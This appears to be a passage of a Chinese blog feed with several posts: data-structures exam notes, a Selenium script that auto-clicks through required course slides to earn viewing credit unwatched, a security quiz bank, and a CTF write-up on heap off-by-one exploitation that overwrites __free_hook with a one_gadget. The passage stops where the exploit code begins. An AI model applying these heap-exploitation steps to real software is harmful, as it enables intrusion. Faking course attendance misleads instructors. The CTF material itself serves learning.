        <content type="html"><![CDATA[<p>要考试了…慌</p><h1 id="第一章-数据结构基础"><a href="#第一章-数据结构基础" class="headerlink" title="第一章 数据结构基础"></a>第一章 数据结构基础</h1><h2 id="基本概念和术语"><a href="#基本概念和术语" class="headerlink" title="基本概念和术语"></a>基本概念和术语</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><blockquote><p>数据（Data）：是对信息的一种符号表示。在计算机科学中是指所有能输入到计算机中并且被计算机程序处理的符号的总称。它是<strong>计算机操作的对象</strong>的总称，是<strong>信息的载体</strong></p></blockquote><blockquote><p>数据元素（Data Element）：是数据（集合）中的一个“个体”，是组成数据的<strong>基本单位</strong>，在计算机程序中通常作为一个整体进行考虑和处理。<strong>它是数据结构中讨论的基本单位</strong></p></blockquote><blockquote><p>数据项：是数据结构中讨论的<strong>最小单位</strong>（不可分割）。<strong>数据元素可以是数据项的集合（组成数据元素的各个项）</strong></p></blockquote><blockquote><p>数据对象（Date Object）：是性质相同的数据元素的集合。是数据的一个<strong>子集</strong></p></blockquote><h3 id="结构的定义"><a href="#结构的定义" class="headerlink" title="结构的定义"></a>结构的定义</h3><p>结构（Structure）：数据元素之间的相互关系</p><blockquote><p>如指数据在逻辑上的关系，称为<strong>逻辑结构</strong><br>如指数据在物理上的关系，称为<strong>物理结构</strong></p></blockquote><h3 id="数据结构的定义"><a href="#数据结构的定义" class="headerlink" title="数据结构的定义"></a>数据结构的定义</h3><p>数据结构（Data Structure）<br>1、描述性定义：是相互之间存在一种或多种特定关系的数据元素的集合</p><p>四、数据结构的分类<br>1、从逻辑结构角度分</p><ul><li>线性结构：线性表、栈、队列</li><li>非线性结构：图、树</li></ul><p>2、从物理结构角度分</p><ul><li>存储结构：物理结构</li></ul><ul><li>四种不同的存储结构<ul><li>1、顺序存储结构：用数据元素在<strong>存储器中的相对位置</strong>来表述数据元素之间的逻辑关系</li><li>2、链式存储结构：在每一个数据元素中添加一个存放地址的指针，用此指针来表示数据<strong>元素</strong>之间的逻辑关系</li><li>3、索引存储方法：该方法通常在存储节点信息的同时，还建立附加的索引表</li><li>4、散列存储方法：根据结点的关键字直接计算出该结点的存储地址</li></ul></li></ul><h2 id="算法和算法分析"><a href="#算法和算法分析" class="headerlink" title="算法和算法分析"></a>算法和算法分析</h2><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>1、算法：是对特定问题求解步骤的一种描述。算法是指令的有限序列，，其中每一条指令表示一个或多个操作<br>2、算法具有以下<strong>五个特性</strong>：</p><ul><li><ol><li><strong>有穷性</strong> </li></ol></li><li><ol start="2"><li><strong>确定性</strong></li></ol></li><li><ol start="3"><li><strong>可行性</strong></li></ol></li><li><ol start="4"><li>输入</li></ol></li><li><ol start="5"><li>输入</li></ol></li></ul><p>3、算法设计的要求<br>评价一个好的算法有以下几个标准：</p><ul><li>正确性<ul><li>所设计的程序没有语法错误</li><li>所设计的程序对于几组输入数据能够得出满足要求的结果</li><li>所设计的程序对于精心选择的典型、苛刻而带有刁难性的几组输入数据能够得到满足要求的结果</li><li>程序对于一切合法的输入数据都能产生满足要求的结果</li></ul></li><li>可读性</li><li>健壮性</li><li>效率与存储量需求</li></ul><h3 id="算法的描述"><a href="#算法的描述" class="headerlink" title="算法的描述"></a>算法的描述</h3><p>1、算法、语言、程序的关系</p><ul><li><ol><li>算法：描述了数据对象的元素之间的关系（包括数据逻辑关系、存储关系描述）</li></ol></li><li><ol start="2"><li>描述算法的工具：自然语言、框图、类c语言</li></ol></li><li><ol start="3"><li>程序是算法在计算机中的实现（与所用计算机及所用语言有关）</li></ol></li></ul><p>2、设计实现算法的过程步骤</p><ul><li><ol><li>找出与求解有关的数据元素之间的关系（建立结构关系）</li></ol></li><li><ol start="2"><li>确定在某一数据对象上所施加运算</li></ol></li><li><ol start="3"><li>考虑数据元素的存储表示</li></ol></li><li><ol start="4"><li>选择描述算法的语言</li></ol></li><li><ol start="5"><li>设计实现求解的算法，并用程序语言加以描述</li></ol></li></ul><h3 id="算法的分析"><a href="#算法的分析" class="headerlink" title="算法的分析"></a>算法的分析</h3><p>1、性能评价<br>对问题规模 n 与该算法在运行时所占的空间 S 与所耗费的时间 T 给出一个<strong>数量关系</strong>的评价</p><h4 id="2、时间与空间数量关系计算"><a href="#2、时间与空间数量关系计算" class="headerlink" title="2、时间与空间数量关系计算"></a>2、时间与空间数量关系计算</h4><p>数量关系评价 体现在时间——算法编程后在机器中所耗费时间<br>数量关系评价 体现在空间——算法编程后在机器中所占存储量</p><p>1）关于算法执行时间<br>有<strong>事先分析</strong>和<strong>事后测试</strong></p><ul><li><strong>事先分析</strong>：求出该算法的一个时间界限函数</li><li><strong>事后测试</strong>：收集此算法的执行时间和实际占用空间的统计资料</li></ul><blockquote><p>语句频度指该语句在算法中重复执行的次数</p></blockquote><p>2）算法的时间复杂度<br>算法的时间度量记作 T(n) = O(f(n))<br>O(f(n))称作算法的<strong>渐进时间复杂度</strong>，简称<strong>时间复杂度</strong></p><p>以下六种计算算法时间的多项式是最常用的。其关系为：</p><blockquote><p>O(1) &lt; O(log n) &lt; O(n) &lt; O(n log n) &lt; O(n^2) &lt; O(n^3) </p></blockquote><p>3）算法的空间复杂度<br>空间复杂度：算法所需存储空间的度量，记作：S(n) = O(f(n))<br>其中 n 为问题的规模（或大小）</p><h2 id="抽象数据类型的表示与定义"><a href="#抽象数据类型的表示与定义" class="headerlink" title="抽象数据类型的表示与定义"></a>抽象数据类型的表示与定义</h2><p>1、数据类型<br><strong>数据类型</strong>是一个<strong>值的集合</strong>和定义在此集合上的<strong>一组操作</strong>的总称<br>2、抽象数据类型<br>在数据结构中我们常用到抽象数据类型。ADT是指抽象数据的组织和与之相关的操作。可以看作是数据的逻辑结构及其在逻辑结构上定义的操作</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某课堂自动过ppt脚本</title>
      <link href="2020/05/03/Develop/The-rain-classroompy/"/>
      <url>2020/05/03/Develop/The-rain-classroompy/</url>
      
        <content type="html"><![CDATA[<div class="note warning flat"><p>Warning 本文章内容仅作学习记录，请勿传播以及用于非法用途</p></div><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>事情的起因嘛其实很简单，特殊时期只能窝在家里，然后老师又在某课堂上放了一堆ppt，还是必须要看的那种，不看就扣平时分<del>（委屈）</del><br>而那个ppt呢，又多又没意思，每页至少就得4、5秒才能成功打卡，贼耗时间。于是乎，出于高效学（wan）习（shua）的目的，决定来写一个脚本去自动跑ppt</p><p>要写脚本首先就要分析相关链接的特点，点击多个ppt后可以发现url中之后最后两块是不一样的，前面都是一样的，这意味着我们可以通过修改最后两个区域来进行ppt的跳转</p><p>接下来我们看看有ppt的页面，点击去以后可以发现并不是ppt直接出来的，二十还需要再点一次（页面上有个ppt的首页，点击后ppt会弹出在页面上）<br>在ppt出来以后我们可以发现他有两种状态：已读和未读。那么我们是否可以用这个来寻找我们还没有播放的ppt呢</p><p>ok，基本的分析就到这儿，接下来我们来考虑如何实现自动“过”ppt</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>脚本的实现我们借助python来写。<br>python里边有个库叫做<strong>selenium</strong>，它可以在python的控制下启动一个浏览器，这样的话，我们就可以一边测试一边来写我们的脚本</p><h3 id="selenium安装"><a href="#selenium安装" class="headerlink" title="selenium安装"></a>selenium安装</h3><p>首先我们需要有python，最好是3.x的，毕竟这个时候2.x已经停止维护了<del>（无疑是废话，手动狗头）</del><br>其次，安装 selenium 库</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><p>当selenium升级到3.0之后，对不同的浏览器驱动进行了规范。<br>如果想使用selenium驱动不同的浏览器，我们还必须单独下载并设置不同的浏览器驱动</p><blockquote><p>   Firefox浏览器驱动：<a href="https://github.com/mozilla/geckodriver/releases">geckodriver</a><br>    Chrome浏览器驱动：<a href="https://sites.google.com/a/chromium.org/chromedriver/home">chromedriver</a> , <a href="https://npm.taobao.org/mirrors/chromedriver">taobao备用地址</a><br>    IE浏览器驱动：<a href="http://selenium-release.storage.googleapis.com/index.html">IEDriverServer</a><br>    Edge浏览器驱动：<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver">MicrosoftWebDriver</a><br>    Opera浏览器驱动：<a href="https://github.com/operasoftware/operachromiumdriver/releases">operadriver</a><br>    PhantomJS浏览器驱动：<a href="http://phantomjs.org/">phantomjs</a></p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>隔了一天继续来写果然兴致不高了呢，我就直接把代码放上来了，有问题的阔以留言讨论哦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="comment"># 导入selenium2中的webdriver库</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化出一个浏览器 </span></span><br><span class="line"><span class="comment">#driver = webdriver.Firefox()       ## 火狐浏览器</span></span><br><span class="line">driver = webdriver.Chrome()         <span class="comment">## 谷歌浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置浏览器窗口的位置和大小</span></span><br><span class="line">driver.set_window_position(<span class="number">20</span>,<span class="number">40</span>)</span><br><span class="line">driver.set_window_size(<span class="number">1100</span>,<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开一个页面</span></span><br><span class="line">driver.get(<span class="string">&quot;https://www.xxxxx.cn/v2/web/stuxxxLog/3xxxxx3&quot;</span>)       <span class="comment">## 部分地方以用xxx隐藏</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">&#x27;changeImg&#x27;</span>).click()</span><br><span class="line">driver.find_element_by_name(<span class="string">&#x27;loginname&#x27;</span>).send_keys(<span class="string">&#x27;xxxxxxxxxxx&#x27;</span>)     <span class="comment">## 雨课堂登陆账号（手机号）</span></span><br><span class="line">driver.find_element_by_name(<span class="string">&#x27;password&#x27;</span>).send_keys(<span class="string">&#x27;xxxxxxxxx&#x27;</span>)        <span class="comment">## 登陆密码</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">&#x27;submit-btn&#x27;</span>).click()</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">arr = [</span><br><span class="line">    <span class="string">&quot;1676766/512342833&quot;</span>,     <span class="comment">## 此处存放各个ppt页面url中的最后两个区域的数字，用逗号分隔</span></span><br><span class="line">    <span class="string">&#x27;1650857/505844824&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;https://www.xxxxx.cn/v2/web/stuxxxLog/3xxxxx3&#x27;</span>  <span class="comment">## 和登陆的url一样呢，目的是为了和ppt的url拼接构成完整的ppt页面url</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:   <span class="comment">## ppt循环</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    driver.get(<span class="built_in">str</span>+i)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        price=driver.find_element_by_xpath(<span class="string">&quot;//*[@id=&#x27;app&#x27;]/div[2]/div/section/main/div[1]/div[1]/div/div[2]/div[1]/p/span[1]&quot;</span>) <span class="comment">## 跳出查看ppt的窗口模块</span></span><br><span class="line">        print(<span class="string">&quot;Start : &quot;</span>+price.text)</span><br><span class="line">        driver.find_element_by_class_name(<span class="string">&#x27;ppt_img_box&#x27;</span>).click()</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            read = driver.find_element_by_css_selector(<span class="string">&#x27;.noRead&#x27;</span>)   <span class="comment">## 查找未看的ppt页面</span></span><br><span class="line">            driver.execute_script(<span class="string">&quot;arguments[0].scrollIntoView();&quot;</span>, read)  <span class="comment">## 将找到的ppt放到页面可视位置（不可视的时候不能过ppt哦）</span></span><br><span class="line">            read.click()</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            n+=<span class="number">1</span></span><br><span class="line">            print(n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">&#x27;行号&#x27;</span>, e.__traceback__.tb_lineno) <span class="comment">## 显示try错误位置，若为查找 **.noRead** 位置报错说明当前ppt已成功观看完毕</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;Error, please check &#x27;&quot;</span>+price.text+<span class="string">&quot;&#x27; for yourself&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(price.text+<span class="string">&quot; is OK!&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出窗口</span></span><br><span class="line">driver.quit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全题库</title>
      <link href="2020/04/24/CTF/xinan-tiku/"/>
      <url>2020/04/24/CTF/xinan-tiku/</url>
      
        <content type="html"><![CDATA[<div class="note primary no-icon flat"><p>做一个自己用的小题库<br>答案有不对的发现了可以随时给我留言哦（记得填邮箱 :smile）</p></div><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">第一节</button></li><li class="tab"><button type="button" data-href="#test1-2">第二节</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p>1、公共信息网络安全监察工作的一般原则（  ）<br>A、预防与打击相结合的原则<br>B、专门机关监管与社会力量相结合的原则<br>C、纠正与制裁相结合的原则<br>D、教育和处罚相结合的原则<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCD</span></span></p><p>2、网络操作系统应当提供哪些安全保障（  ）<br>A、验证(Authentication)<br>B、授权(Authorization)<br>C、数据保密性(Data Confidentiality)<br>D、数据一致性(Data Integrity)<br>E、数据的不可否认性(Data Nonrepudiation)<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCDE</span></span></p><p>3、Windows NT的”域”控制机制具备哪些安全特性?（  ）<br>A、用户身份验证<br>B、访问控制<br>C、审计(日志)<br>D、数据通讯的加密<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>4、从系统整体看,安全”漏洞”包括哪些方面（  ）<br>A、技术因素<br>B、人的因素<br>C、规划,策略和执行过程<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>5、从系统整体看,下述那些问题属于系统安全漏洞（  ）<br>A、产品缺少安全功能<br>B、产品有Bugs<br>C、缺少足够的安全知识<br>D、人为错误<br>E、缺少针对安全的系统设计<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCDE</span></span></p><p>6、应对操作系统安全漏洞的基本方法是什么?（  ）<br>A、对默认安装进行必要的调整<br>B、给所有用户设置严格的口令<br>C、及时安装最新的安全补丁<br>D、更换到另一种操作系统<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>7、造成操作系统安全漏洞的原因（  ）<br>A、不安全的编程语言<br>B、不安全的编程习惯<br>C、考虑不周的架构设计<br>D、人为的恶意破坏<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>8、严格的口令策略应当包含哪些要素（  ）<br>A、满足一定的长度,比如8位以上<br>B、同时包含数字,字母和特殊字符<br>C、系统强制要求定期更改口令<br>D、用户可以设置空口令<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>9、计算机安全事件包括以下几个方面（  ）<br>A、重要安全技术的采用<br>B、安全标准的贯彻<br>C、安全制度措施的建设与实施<br>D、重大安全隐患、违法违规的发现,事故的发生<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCD</span></span></p><p>10、计算机案件包括以下几个内容（  ）<br>A、违反国家法律的行为<br>B、违反国家法规的行为<br>C、危及、危害计算机信息系统安全的事件<br>D、计算机硬件常见机械故障<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p>1、重大计算机安全事故和计算机违法案件可由_____受理<br>A、案发地市级公安机关公共信息网络安全监察部门<br>B、案发地当地县级(区、市)公安机关治安部门<br>C、案发地当地县级(区、市)公安机关公共信息网络安全监察部门<br>D、案发地当地公安派出所<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">AC</span></span></p><p>2.现场勘查主要包括以下几个环节_____<br>A、对遭受破坏的计算机信息系统的软硬件的描述及被破坏程度<br>B、现场现有电子数据的复制和修复<br>C、电子痕迹的发现和提取,证据的固定与保全<br>D、现场采集和扣押与事故或案件有关的物品<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCD</span></span></p><p>3.计算机安全事故原因的认定和计算机案件的数据鉴定,____<br>A、是一项专业性较强的技术工作<br>B、必要时可进行相关的验证或侦查实验<br>C、可聘请有关方面的专家,组成专家鉴定组进行分析鉴定<br>D、可以由发生事故或计算机案件的单位出具鉴定报告<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>4、有害数据通过在信息网络中的运行,主要产生的危害有_____<br>A、攻击国家政权,危害国家安全<br>B、破坏社会治安秩序<br>C、破坏计算机信息系统,造成经济的社会的巨大损失<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>5、计算机病毒的特点<strong>__</strong><br>A、传染性<br>B、可移植性<br>C、破坏性<br>D、可触发性<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ACD</span></span></p><p>6、计算机病毒按传染方式分为____<br>A、良性病毒<br>B、引导型病毒<br>C、文件型病毒<br>D、复合型病毒<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">BCD</span></span></p><p>7、计算机病毒的危害性有以下几种表现<strong>__</strong><br>A、删除数据<br>B、阻塞网络<br>C、信息泄漏<br>D、烧毁主板<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABC</span></span></p><p>8.计算机病毒由_____部分组成<br>A、引导部分<br>B、传染部分<br>C、运行部分<br>D、表现部分<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABD</span></span></p><p>9.以下哪些措施可以有效提高病毒防治能力_______<br>A、安装、升级杀毒软件<br>B、升级系统、打补丁<br>C、提高安全防范意识<br>D、不要轻易打开来历不明的邮件<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCD</span></span></p><p>10.计算机病毒的主要传播途径有<strong>__</strong><br>A、电子邮件<br>B、网络<br>C、存储介质<br>D、文件交换<br>参考答案：<span class="hide-inline"><button type="button" class="hide-button button--animated" style="">Click<br>  </button><span class="hide-content">ABCD</span></span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 题库 </category>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off_by_one</title>
      <link href="2020/03/10/CTF/ctf-challengs-off-by-one/"/>
      <url>2020/03/10/CTF/ctf-challengs-off-by-one/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先我们先大致了解一下什么是<strong>off_by_one</strong>，直接套用<a href="https://wiki.x10sec.org/pwn/heap/off_by_one/">ctfwiki</a>中的解释：</p><blockquote><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p></blockquote><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误(这在 C 语言初学者中很常见)导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于Linux堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上(heap based)的off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><p>ok，至于具体的例子我就不过多赘述了，直接上<a href="https://wiki.x10sec.org/pwn/heap/off_by_one/">ctfwiki</a>中看他写出的那两个小例子就行</p><p>这里写的是wiki中写的那道题，[Asis_2016_b00ks]<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/off_by_one/Asis_2016_b00ks/b00ks">题目链接</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>wiki的题我们就直接分析了，不再做过多测试。</p><p>手动运行一次过后，掏出我们的神器<strong>IDA</strong>开始生刚</p><p>通过<strong>Create a book</strong>这个函数我们可以大致写出它的结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct book</span><br><span class="line">&#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *description;</span><br><span class="line">    int size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且每增加一本书，系统会自动开辟三块空间来分别存放<strong>name</strong>，<strong>description</strong>和整本书的结构体<strong>book</strong></p><p>在这里首先有一个点我们需要注意</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v3 &#x3D; malloc(0x20uLL);</span><br><span class="line">if ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)v3 + 6) &#x3D; v1;</span><br><span class="line">  *((_QWORD *)off_202010 + v2) &#x3D; v3;</span><br><span class="line">  *((_QWORD *)v3 + 2) &#x3D; v5;</span><br><span class="line">  *((_QWORD *)v3 + 1) &#x3D; ptr;</span><br><span class="line">  *(_DWORD *)v3 &#x3D; ++unk_202024;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v3就是创建的整个书本的指针，在 <strong>if</strong> 中的第二行我们可以看到程序将v3指针保存了起来,一路跟踪进去可以发现是 <strong>.bss</strong> 段的一个地址。</p><p>而这个时候，如果你能联想起在程序一开始的的那个 <strong>author name</strong> ，就可以发现一个惊喜。</p><p>在我们输入 <strong>author</strong> 的时候，系统会创建一个数组放在 <strong>.bss</strong> 段的一个位置，而这个位置刚好就在保存的 <strong>book</strong> 指针的正上方（如下图）</p><p><img src= "/img/loading.gif" data-lazy-src="/pic/off_by_one/BurYiA1584061310.png"></p><p>接下来我们来找漏洞点，最终，我们可以发现这个用于读取的函数</p><p><img src= "/img/loading.gif" data-lazy-src="/pic/off_by_one/BurYiA1584061878.png"></p><p>随便带个值算一下就可以发现他会溢出一个字节（溢出的是字符串数组的结束符 <strong>\x00</strong> ）。</p><p>这时需要注意一个问题，存放author的缓冲区只有 32 字节，而输入author的时候正好可以溢出一个字节，而author的下面就是存放 <strong>book</strong> 指针的地方，也就是说我们可以覆盖掉 <strong>book</strong> 指针的最后一个字节，使其变成 <strong>\x00</strong> ，或者我们可以覆盖掉字符串的结束符    <del>(￣y▽￣)~*捂嘴偷笑</del></p><h2 id="攻击过程分析"><a href="#攻击过程分析" class="headerlink" title="攻击过程分析"></a>攻击过程分析</h2><p>整个看一下程序，发现没有system等函数，但是有个free，思路是将free函数通过变换让其直接变成shellcode，这样当我们使用free函数的时候就会自动执行shellcode，获取权限</p><p>接下来看整个程序,我们可以创建一个书本结构体，每新建一本书，系统会申请三个堆块分别用于存储 <strong>name</strong> 、<strong>description</strong> 和 <strong>book</strong>。</p><p>其中，我们可以修改的有 <strong>description</strong> 和一开始我们输入的 <strong>author name</strong>，并且通过修改 <strong>author name</strong>的内容我们可以覆盖掉第一个 <strong>book</strong> 指针的最后两位</p><p>那么，我们是否可以 <strong>伪造一个book</strong> ，将这 “book” 的 <strong>description</strong> 指针指向一个真实的book结构体的 <strong>descrition</strong> 指针。这样，通过修改这个我们伪造的 <strong>book 的 description</strong>，我们就可以修改那个真实的 book 的 <strong>description</strong> 的内存空间，这样，再通过修改此时的 <strong>description</strong> ，我们就可以做到一个任意位置读写，</p><p>也就是说，我们完全用过它来修改 free 函数的关键部分，打开一个 libc 库，我们看看其中的 free 函数</p><p><img src= "/img/loading.gif" data-lazy-src="../pic/off_by_one/BurYiA1584244153.png"></p><p>可以看到，当 <strong>_free_hook</strong> 存在时，会直接返回它，我们跟进去可以看到它是一个名为<strong>__free_hook</strong> 的字符串(注意是两个“_”)，这一点我们也可以在字符串窗口验证，搜索也可以到这个字符串</p><p>那这样就好弄多了，我们可以通过我们伪造的 book 来修改 真实的 book 的 description 让他指向 <strong>__free_hook</strong> ，这时，我们在通过修改那个真实的 book 的 description，也就是现在指向的 <strong>__free_hook</strong> 字符串，将他变成我们的shellcode就好了，至于shellcode，我们可以通过  “one_gadget” 来寻找 libc 中的shell直接运用</p><p>接下来的问题就是如何去构造那个伪造的 book。在上面我们知道 author name哪儿有一个漏洞可以改变指向 book 指针的位置，它能将指针的最后两位变成 <strong>“/x00”</strong>，在gdb中我们可以看到存放 book 的内存之前也就是 name 和 description 这两快内存，而 description 我们正好可以修改，那我们只要在 description 中按照 book 的格式伪造一块内存就能达到我们上述的目的了。</p><p>构造好折后要思考的是如何让book指针指过来，因为前面说过 book指针可以覆盖，那么，我们只要通过合理的申请内存的大小即可让 description 块的内容区域的最后两位为 “/x00”。这样，再将book覆盖以后就能指向我们伪造的 book 哪儿去。</p><p>至于修改<strong>“__free_hook”</strong>，我们需要知道libc的加载位置。这个的话我们可以通过偏移来计算。当要申请的内存超大的时候，堆的申请会以mmap的形式来进行，而这样申请下的内存与libc是有着固定的偏移的，这个偏移我们通过gdb就可以调试出来</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>EXP是ctf-challengs中自带的那个，但是这个题因为环境一变，有些东西就不一样了，所以得做出修改，根据上面的分析修改就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 